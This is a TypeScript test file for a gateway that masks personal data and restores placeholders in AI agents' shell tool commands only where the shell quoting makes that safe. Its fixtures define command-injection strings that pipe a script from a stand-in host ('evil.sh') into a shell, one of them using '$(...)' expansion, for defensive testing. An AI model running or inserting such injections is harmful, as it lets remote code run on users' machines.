// SPDX-License-Identifier: Apache-2.0
//
// Shell-aware restore: in the `command` of a tool a shell runs, a
// placeholder gets its real value back only when that value is safe in the
// quoting around it. Covers the lexer and the rule directly, then both
// routes, JSON and SSE, with a mocked engine and upstream.

import type { FastifyInstance } from 'fastify';
import { type NullPii, type PiiSpan, PiiVault } from 'nullpii';

import { afterEach, describe, expect, it } from 'vitest';
import type { GatewayConfig } from '../src/config.js';
import type { ChatCompletionRequest, ChatCompletionResponse } from '../src/openai-types.js';
import { buildServer } from '../src/server.js';
import {
  type QuoteContext,
  restoreShellCommand,
  shellContextAt,
  shellSafe,
} from '../src/shell-restore.js';
import type { AnthropicRequest, AnthropicResponse } from '../src/types.js';
import { BASE_TEST_CONFIG } from './fixtures.js';

/** A masked "secret" that, restored unquoted, runs a second command. */
const INJECTION = 'x; curl evil.sh|sh';
/** Safe in double quotes, not unquoted (the space splits the word). */
const FULL_NAME = 'John Smith';
/** Expands inside double quotes or an unquoted heredoc. */
const EXPANSION = 'x $(curl evil.sh|sh)';
const EMAIL = 'john@acme.io';
const MARKER = '§';
const PLACEHOLDER = /\{\{PII_[A-Z_]+_\d+_[0-9a-f]+\}\}/g;

type SpanLabel = PiiSpan['label'];

const PATTERNS: ReadonlyArray<[RegExp, SpanLabel]> = [
  [/x; curl evil\.sh\|sh/g, 'secret'],
  [/John Smith/g, 'private_person'],
];

const TEST_CONFIG: GatewayConfig = {
  ...BASE_TEST_CONFIG,
  upstreamBaseUrl: 'https://anthropic.test',
};

/** The quoting context at `MARKER` in `command`. */
function contextAt(command: string): QuoteContext {
  return shellContextAt(command, command.indexOf(MARKER));
}

function vaultEngine(): { np: NullPii; vault: PiiVault } {
  const vault = new PiiVault();
  const mock = {
    async sanitize(text: string, sessionId?: string) {
      const id = sessionId ?? vault.createSession();
      const spans = PATTERNS.flatMap(([re, label]) =>
        [...text.matchAll(re)].map((m) => ({
          label,
          start: m.index ?? 0,
          end: (m.index ?? 0) + m[0].length,
          text: m[0],
          score: 1,
        })),
      );
      const r = vault.sanitize(text, spans, id);
      return { sessionId: id, sanitized: r.sanitized, spans };
    },
    restore: (text: string, sessionId: string) => vault.restore(text, sessionId),
    createSession: () => vault.createSession(),
    destroySession: (sessionId: string) => vault.destroySession(sessionId),
  };
  return { np: mock as unknown as NullPii, vault };
}

function bake(vault: PiiVault, sessionId: string, value: string, label: SpanLabel): string {
  const span = { label, start: 0, end: value.length, text: value, score: 1 };
  return vault.sanitize(value, [span], sessionId).sanitized;
}

/** `[secret, person]` placeholders for the user message every route test sends. */
const USER_TEXT = `Run ${INJECTION} for ${FULL_NAME}`;

function placeholdersIn(text: unknown): [string, string] {
  const found = typeof text === 'string' ? (text.match(PLACEHOLDER) ?? []) : [];
  const [secret, person] = found;
  if (secret === undefined || person === undefined) throw new Error('expected two placeholders');
  return [secret, person];
}

/** A Claude Code-style commit: the message is a quoted heredoc. */
function commitWith(message: string): string {
  return `git commit -m "$(cat <<'EOF'\n${message}\nEOF\n)"`;
}

/** One command using each placeholder unquoted, quoted, and in a heredoc. */
function bashCommand(secret: string, person: string): string {
  return `echo ${secret} && echo '${secret}' && echo "${person}" && echo ${person} && ${commitWith(`Thanks ${person}`)}`;
}

/** What the client must receive: real values only where they are safe. */
function expectedCommand(secret: string, person: string): string {
  return `echo ${secret} && echo '${INJECTION}' && echo "${FULL_NAME}" && echo ${person} && ${commitWith(`Thanks ${FULL_NAME}`)}`;
}

const apps: FastifyInstance[] = [];
afterEach(async () => {
  await Promise.all(apps.map((a) => a.close()));
  apps.length = 0;
});

async function serve(
  respond: (body: string) => Response,
  extra: { logStream?: { write(line: string): void }; logLevel?: GatewayConfig['logLevel'] } = {},
) {
  const { np } = vaultEngine();
  const fetchImpl = async (_url: string, init: RequestInit) => respond(init.body as string);
  const config = {
    ...TEST_CONFIG,
    ...(extra.logLevel !== undefined && { logLevel: extra.logLevel }),
  };
  const app = await buildServer({
    config,
    np,
    fetchImpl,
    ...(extra.logStream !== undefined && { logStream: extra.logStream }),
  });
  apps.push(app);
  return app;
}

function sseResponse(frames: string[]): Response {
  return new Response(frames.join(''), { headers: { 'content-type': 'text/event-stream' } });
}

function anthropicFrame(event: string, data: unknown): string {
  return `event: ${event}\ndata: ${JSON.stringify(data)}\n\n`;
}

function openAiFrame(choices: unknown[]): string {
  return `data: ${JSON.stringify({ id: 'c1', object: 'chat.completion.chunk', choices })}\n\n`;
}

/** Concatenate a stream's tool-input shards per block (Anthropic) or per
 * tool-call index (OpenAI), as the SDKs do. */
function streamedInputs(body: string): Map<number, string> {
  const out = new Map<number, string>();
  const add = (index: number, shard: unknown): void => {
    if (typeof shard === 'string') out.set(index, (out.get(index) ?? '') + shard);
  };
  for (const frame of body.split('\n\n')) {
    const line = frame.split('\n').find((l) => l.startsWith('data: '));
    if (line === undefined || line === 'data: [DONE]') continue;
    const data = JSON.parse(line.slice('data: '.length)) as {
      index?: number;
      delta?: { partial_json?: string };
      choices?: Array<{
        delta?: { tool_calls?: Array<{ index: number; function?: { arguments?: string } }> };
      }>;
    };
    if (typeof data.index === 'number') add(data.index, data.delta?.partial_json);
    for (const call of data.choices?.[0]?.delta?.tool_calls ?? []) {
      add(call.index, call.function?.arguments);
    }
  }
  return out;
}

describe('shell restore · quoting context', () => {
  it.each<[string, QuoteContext]>([
    [`echo ${MARKER}`, 'none'],
    [`echo '${MARKER}'`, 'single'],
    [`echo "${MARKER}"`, 'double'],
    [`echo \\'${MARKER}`, 'none'],
    [`echo "it's ${MARKER}"`, 'double'],
    [`echo 'a "b' ${MARKER}`, 'none'],
    [`echo "a \\" ${MARKER}"`, 'double'],
    [`echo 'a \\' ${MARKER}`, 'none'],
    // A command substitution is unquoted, even inside double quotes.
    [`echo "$(cat ${MARKER})"`, 'none'],
    [`echo "\`cat ${MARKER}\`"`, 'none'],
    [`echo "$(printf "${MARKER}")"`, 'double'],
    [`echo "$(echo (a)) ${MARKER}"`, 'double'],
    [`echo "$((1 + 2)) ${MARKER}"`, 'double'],
    // Heredoc bodies fed to cat or tee: literal, or expanding when bare.
    [`cat <<'EOF'\n${MARKER}\nEOF`, 'heredoc'],
    [`cat <<"EOF"\n${MARKER}\nEOF`, 'heredoc'],
    [`cat <<\\EOF\n${MARKER}\nEOF`, 'heredoc'],
    [`cat <<-'EOF'\n\t${MARKER}\n\tEOF`, 'heredoc'],
    [`cat <<'EOF' > notes.txt\n${MARKER}\nEOF`, 'heredoc'],
    [`tee notes.txt <<'EOF'\n${MARKER}\nEOF`, 'heredoc'],
    [commitWith(`Thanks ${MARKER}`), 'heredoc'],
    [`cat <<EOF\n${MARKER}\nEOF`, 'double'],
    [`cat <<EOF\n$(echo ${MARKER})\nEOF`, 'none'],
    // A body is not shell code: its apostrophe opens no quote.
    [`cat <<'EOF'\nit's done\nEOF\necho ${MARKER}`, 'none'],
    // Not heredocs: `<<` inside quotes, or the here-string `<<<`.
    [`echo '<<EOF'\n${MARKER}`, 'none'],
    [`cat <<<"x"\n${MARKER}`, 'none'],
    // A body another program may run, one piped on, one never closed.
    [`python3 - <<'EOF'\nprint('${MARKER}')\nEOF`, 'none'],
    [`cat <<'EOF' | grep x\n${MARKER}\nEOF`, 'none'],
    [`cat <<'EOF'\n${MARKER}`, 'none'],
    // Code handed to another interpreter: the strictest rule.
    [`bash -lc "echo ${MARKER}"`, 'none'],
    [`sh -c '${MARKER}'`, 'none'],
    [`eval "echo ${MARKER}"`, 'none'],
    [`ssh host "echo ${MARKER}"`, 'none'],
    [`su -c 'echo ${MARKER}'`, 'none'],
    [`python3 -c 'print("${MARKER}")'`, 'none'],
    [`node -e 'console.log("${MARKER}")'`, 'none'],
    [`echo '${MARKER}' | bash`, 'none'],
    [`awk '{print "${MARKER}"}' data.txt`, 'none'],
  ])('%j → %s', (command, context) => {
    expect(contextAt(command)).toBe(context);
  });

  it.each<[string, QuoteContext, boolean]>([
    ['john@acme.io', 'none', true],
    [FULL_NAME, 'none', false],
    [INJECTION, 'none', false],
    [INJECTION, 'single', true],
    ["O'Brien", 'single', false],
    ['two\nlines', 'single', false],
    [FULL_NAME, 'double', true],
    ['$HOME', 'double', false],
    ['a"b', 'double', false],
    ['a`id`', 'double', false],
    ['a\\b', 'double', false],
    ['hi!', 'double', false],
    [FULL_NAME, 'heredoc', true],
    [EXPANSION, 'heredoc', true],
    ['two\nlines', 'heredoc', false],
    // A leading dash would read as an option to the command.
    ['-rf', 'none', false],
    ['--output=/tmp/x', 'single', false],
    ['-v', 'double', false],
    ['-- a list item', 'heredoc', true],
  ])('shellSafe(%j, %s) is %s', (value, context, safe) => {
    expect(shellSafe(value, context)).toBe(safe);
  });
});

describe('shell restore · restoreShellCommand', () => {
  function harness() {
    const { np, vault } = vaultEngine();
    const sessionId = vault.createSession();
    return { np, vault, sessionId };
  }

  it('keeps an unsafe value masked unquoted, and restores it inside single quotes', () => {
    const { np, vault, sessionId } = harness();
    const secret = bake(vault, sessionId, INJECTION, 'secret');

    const r = restoreShellCommand(np, `echo ${secret} && echo '${secret}'`, sessionId);

    expect(r.command).toBe(`echo ${secret} && echo '${INJECTION}'`);
    expect(r.keptMasked).toHaveLength(1);
    expect(r.results.reduce((n, x) => n + x.replacements, 0)).toBe(1);
  });

  it('restores a name with a space in double quotes, not unquoted', () => {
    const { np, vault, sessionId } = harness();
    const person = bake(vault, sessionId, FULL_NAME, 'private_person');

    const r = restoreShellCommand(np, `echo "${person}" ${person}`, sessionId);

    expect(r.command).toBe(`echo "${FULL_NAME}" ${person}`);
    expect(r.keptMasked).toHaveLength(1);
  });

  it('keeps an unsafe value masked inside a command substitution in double quotes', () => {
    const { np, vault, sessionId } = harness();
    const secret = bake(vault, sessionId, INJECTION, 'secret');

    const r = restoreShellCommand(np, `echo "$(echo ${secret})"`, sessionId);

    expect(r.command).toBe(`echo "$(echo ${secret})"`);
    expect(r.keptMasked).toHaveLength(1);
  });

  it('restores a two-word name in a quoted heredoc (Claude Code commit message)', () => {
    const { np, vault, sessionId } = harness();
    const person = bake(vault, sessionId, FULL_NAME, 'private_person');

    const r = restoreShellCommand(np, commitWith(`Thanks ${person}`), sessionId);

    expect(r.command).toBe(commitWith(`Thanks ${FULL_NAME}`));
    expect(r.keptMasked).toHaveLength(0);
  });

  it('keeps a value with `$` masked in an unquoted heredoc, restores it in a quoted one', () => {
    const { np, vault, sessionId } = harness();
    const ph = bake(vault, sessionId, EXPANSION, 'secret');

    const r = restoreShellCommand(np, `cat <<EOF\n${ph}\nEOF\ncat <<'EOF'\n${ph}\nEOF`, sessionId);

    expect(r.command).toBe(`cat <<EOF\n${ph}\nEOF\ncat <<'EOF'\n${EXPANSION}\nEOF`);
    expect(r.keptMasked).toHaveLength(1);
  });

  it('keeps a name masked in a heredoc that another program reads', () => {
    const { np, vault, sessionId } = harness();
    const person = bake(vault, sessionId, FULL_NAME, 'private_person');
    const command = `python3 - <<'EOF'\nprint('${person}')\nEOF`;

    const r = restoreShellCommand(np, command, sessionId);

    expect(r.command).toBe(command);
    expect(r.keptMasked).toHaveLength(1);
  });

  it('bash -lc: keeps a two-word name masked, restores a plain-word email', () => {
    const { np, vault, sessionId } = harness();
    const person = bake(vault, sessionId, FULL_NAME, 'private_person');
    const email = bake(vault, sessionId, EMAIL, 'private_email');

    const r = restoreShellCommand(np, `bash -lc "echo ${person} ${email}"`, sessionId);

    expect(r.command).toBe(`bash -lc "echo ${person} ${EMAIL}"`);
    expect(r.keptMasked).toHaveLength(1);
  });

  it('counts an unknown placeholder as unknown, not as unsafe', () => {
    const { np, vault, sessionId } = harness();
    const known = bake(vault, sessionId, 'readme.md', 'private_url');
    const unknown = known.replace(/_\d+_/, '_99_');

    const r = restoreShellCommand(np, `cat ${known} ${unknown}`, sessionId);

    expect(r.command).toBe(`cat readme.md ${unknown}`);
    expect(r.keptMasked).toHaveLength(0);
    expect(r.results.reduce((n, x) => n + x.unknownPlaceholders.length, 0)).toBe(1);
  });
});

describe('shell restore · Anthropic route', () => {
  function forwardedUserText(body: string): unknown {
    return (JSON.parse(body) as AnthropicRequest).messages[0]?.content;
  }

  it('JSON: restores a Bash command only where safe, a Write tool fully', async () => {
    const app = await serve((body) => {
      const [secret, person] = placeholdersIn(forwardedUserText(body));
      const response: AnthropicResponse = {
        id: 'msg',
        type: 'message',
        role: 'assistant',
        content: [
          {
            type: 'tool_use',
            id: 'tu_1',
            name: 'Bash',
            input: { command: bashCommand(secret, person), description: `Greet ${person}` },
          },
          {
            type: 'tool_use',
            id: 'tu_2',
            name: 'Write',
            input: { file_path: '/tmp/notes.txt', content: `${secret} ${person}` },
          },
        ],
      };
      return new Response(JSON.stringify(response));
    });

    const res = await app.inject({
      method: 'POST',
      url: '/v1/messages',
      payload: { model: 'claude-test', messages: [{ role: 'user', content: USER_TEXT }] },
    });

    expect(res.statusCode).toBe(200);
    const [bash, write] = (res.json() as AnthropicResponse).content as Array<{
      input: Record<string, string>;
    }>;
    const [secret, person] = placeholdersIn(bash?.input.command);
    expect(bash?.input.command).toBe(expectedCommand(secret, person));
    // Not run by the shell: restored as usual.
    expect(bash?.input.description).toBe(`Greet ${FULL_NAME}`);
    expect(write?.input.content).toBe(`${INJECTION} ${FULL_NAME}`);
  });

  it('SSE: same rule for a Bash command streamed as input_json_delta shards', async () => {
    const app = await serve((body) => {
      const [secret, person] = placeholdersIn(forwardedUserText(body));
      const bash = JSON.stringify({ command: bashCommand(secret, person) });
      const write = JSON.stringify({ file_path: '/tmp/notes.txt', content: `${secret} ${person}` });
      const cut = bash.indexOf(secret) + 6; // inside the first placeholder
      const shard = (index: number, partial: string) =>
        anthropicFrame('content_block_delta', {
          type: 'content_block_delta',
          index,
          delta: { type: 'input_json_delta', partial_json: partial },
        });
      const start = (index: number, name: string) =>
        anthropicFrame('content_block_start', {
          type: 'content_block_start',
          index,
          content_block: { type: 'tool_use', id: `tu_${index}`, name, input: {} },
        });
      const stop = (index: number) =>
        anthropicFrame('content_block_stop', { type: 'content_block_stop', index });
      return sseResponse([
        start(0, 'Bash'),
        shard(0, bash.slice(0, cut)),
        shard(0, bash.slice(cut)),
        stop(0),
        start(1, 'Write'),
        shard(1, write),
        stop(1),
        anthropicFrame('message_stop', { type: 'message_stop' }),
      ]);
    });

    const res = await app.inject({
      method: 'POST',
      url: '/v1/messages',
      payload: {
        model: 'claude-test',
        stream: true,
        messages: [{ role: 'user', content: USER_TEXT }],
      },
    });

    expect(res.statusCode).toBe(200);
    const inputs = streamedInputs(res.body);
    const bash = JSON.parse(inputs.get(0) ?? '') as { command: string };
    const [secret, person] = placeholdersIn(bash.command);
    expect(bash.command).toBe(expectedCommand(secret, person));
    expect(JSON.parse(inputs.get(1) ?? '')).toEqual({
      file_path: '/tmp/notes.txt',
      content: `${INJECTION} ${FULL_NAME}`,
    });
  });
});

describe('shell restore · OpenAI route', () => {
  function forwardedUserText(body: string): unknown {
    return (JSON.parse(body) as ChatCompletionRequest).messages[0]?.content;
  }

  it('JSON: restores a `bash` command only where safe, another tool fully', async () => {
    const app = await serve((body) => {
      const [secret, person] = placeholdersIn(forwardedUserText(body));
      const response: ChatCompletionResponse = {
        id: 'c1',
        object: 'chat.completion',
        choices: [
          {
            index: 0,
            finish_reason: 'tool_calls',
            message: {
              role: 'assistant',
              content: null,
              tool_calls: [
                {
                  id: 'call_1',
                  type: 'function',
                  function: {
                    name: 'bash',
                    arguments: JSON.stringify({ command: bashCommand(secret, person) }),
                  },
                },
                {
                  id: 'call_2',
                  type: 'function',
                  function: {
                    name: 'write_file',
                    arguments: JSON.stringify({ content: `${secret} ${person}` }),
                  },
                },
                {
                  id: 'call_3',
                  type: 'custom',
                  custom: { name: 'shell', input: `echo ${secret} '${secret}'` },
                },
              ],
            },
          },
        ],
      };
      return new Response(JSON.stringify(response));
    });

    const res = await app.inject({
      method: 'POST',
      url: '/v1/chat/completions',
      payload: { model: 'gpt-test', messages: [{ role: 'user', content: USER_TEXT }] },
    });

    expect(res.statusCode).toBe(200);
    const calls = (res.json() as ChatCompletionResponse).choices[0]?.message?.tool_calls ?? [];
    const bash = JSON.parse(calls[0]?.function?.arguments ?? '') as { command: string };
    const [secret, person] = placeholdersIn(bash.command);
    expect(bash.command).toBe(expectedCommand(secret, person));
    expect(JSON.parse(calls[1]?.function?.arguments ?? '')).toEqual({
      content: `${INJECTION} ${FULL_NAME}`,
    });
    // A custom shell tool's whole input is the command.
    expect(calls[2]?.custom?.input).toBe(`echo ${secret} '${INJECTION}'`);
  });

  it('SSE: same rule for a `shell` call whose arguments stream in shards', async () => {
    const app = await serve((body) => {
      const [secret, person] = placeholdersIn(forwardedUserText(body));
      const args = JSON.stringify({ command: bashCommand(secret, person) });
      const cut = args.indexOf(secret) + 6;
      const call = (fn: Record<string, string>, extra: Record<string, string> = {}) =>
        openAiFrame([{ index: 0, delta: { tool_calls: [{ index: 0, ...extra, function: fn }] } }]);
      return sseResponse([
        call({ name: 'shell', arguments: '' }, { id: 'call_1', type: 'function' }),
        call({ arguments: args.slice(0, cut) }),
        call({ arguments: args.slice(cut) }),
        openAiFrame([{ index: 0, delta: {}, finish_reason: 'tool_calls' }]),
        'data: [DONE]\n\n',
      ]);
    });

    const res = await app.inject({
      method: 'POST',
      url: '/v1/chat/completions',
      payload: {
        model: 'gpt-test',
        stream: true,
        messages: [{ role: 'user', content: USER_TEXT }],
      },
    });

    expect(res.statusCode).toBe(200);
    const command = (JSON.parse(streamedInputs(res.body).get(0) ?? '') as { command: string })
      .command;
    const [secret, person] = placeholdersIn(command);
    expect(command).toBe(expectedCommand(secret, person));
  });
});

describe('shell restore · request log', () => {
  it.each([
    ['/v1/messages', 'anthropic.messages.restored'],
    ['/v1/chat/completions', 'openai.chat.restored'],
  ])('%s logs how many placeholders stayed masked, never a value', async (url, message) => {
    const lines: string[] = [];
    const app = await serve(
      (body) => {
        const request = JSON.parse(body) as { messages: Array<{ content: unknown }> };
        const [secret, person] = placeholdersIn(request.messages[0]?.content);
        const command = bashCommand(secret, person);
        const response =
          url === '/v1/messages'
            ? {
                id: 'msg',
                type: 'message',
                role: 'assistant',
                content: [{ type: 'tool_use', id: 'tu', name: 'Bash', input: { command } }],
              }
            : {
                id: 'c1',
                object: 'chat.completion',
                choices: [
                  {
                    index: 0,
                    message: {
                      role: 'assistant',
                      tool_calls: [
                        {
                          id: 'call',
                          type: 'function',
                          function: { name: 'bash', arguments: JSON.stringify({ command }) },
                        },
                      ],
                    },
                  },
                ],
              };
        return new Response(JSON.stringify(response));
      },
      { logLevel: 'info', logStream: { write: (line) => lines.push(line) } },
    );

    const res = await app.inject({
      method: 'POST',
      url,
      payload: { model: 'test', messages: [{ role: 'user', content: USER_TEXT }] },
    });

    expect(res.statusCode).toBe(200);
    const entry = lines
      .map((l) => JSON.parse(l) as { msg?: string; unsafeShellPlaceholders?: unknown })
      .find((l) => l.msg === message);
    // Unquoted secret and unquoted name stayed masked.
    expect(entry?.unsafeShellPlaceholders).toBe(2);
    const log = lines.join('');
    for (const value of [INJECTION, 'evil.sh', FULL_NAME, 'Smith']) {
      expect(log).not.toContain(value);
    }
  });
});
